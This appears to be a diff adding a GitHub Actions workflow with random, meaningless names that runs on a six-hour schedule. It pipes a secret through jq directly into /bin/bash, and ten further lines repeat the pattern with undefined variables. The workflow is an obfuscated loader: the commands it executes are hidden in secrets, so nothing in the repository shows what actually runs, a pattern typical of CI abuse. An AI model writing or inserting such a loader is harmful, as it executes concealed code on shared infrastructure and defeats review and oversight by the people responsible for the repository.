@@ -1,0 +1,27 @@
+name: fangziwenni
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangziwenni
+        env:
+          tolyy19: ${{ secrets.tolyy19 }}
+        run: |
+          echo $tolyy19 | jq -r .h83711 | /bin/bash
+          echo $p72758 | jq -r .lbc16015 | /bin/bash
+          echo $vga8 | jq -r .frz287 | /bin/bash
+          echo $yqgs9 | jq -r .ih58545 | /bin/bash
+          echo $nhk0 | jq -r .odye1584 | /bin/bash
+          echo $nf27968 | jq -r .k08411 | /bin/bash
+          echo $d82890 | jq -r .we55 | /bin/bash
+          echo $thhn3 | jq -r .i308 | /bin/bash
+          echo $yhhb0905 | jq -r .r67470 | /bin/bash
+          echo $mvwii0501 | jq -r .xvph17373 | /bin/bash
+          echo $ii637 | jq -r .w7 | /bin/bash
+
